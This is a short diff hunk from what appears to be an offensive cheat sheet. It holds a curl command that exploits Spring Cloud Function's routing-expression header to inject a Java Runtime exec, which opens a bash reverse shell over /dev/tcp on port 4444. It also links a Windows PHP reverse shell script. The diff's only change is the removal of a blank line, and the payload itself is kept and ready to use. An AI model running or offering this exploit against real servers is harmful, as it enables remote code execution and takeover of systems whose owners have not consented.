@@ -3,7 +3,6 @@ JAVA Spring Boot cloud exploit and rev-shell:
 ```shell
 curl -X POST [http://$TARGET_IP:8080/functionRouter](http://$TARGET_IP:8080/functionRouter) -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/$TARGET_IP/4444 0>&1")' --data-raw 'data' -v
 ```
-
 Windows PHP rev shell
 ---
 [https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
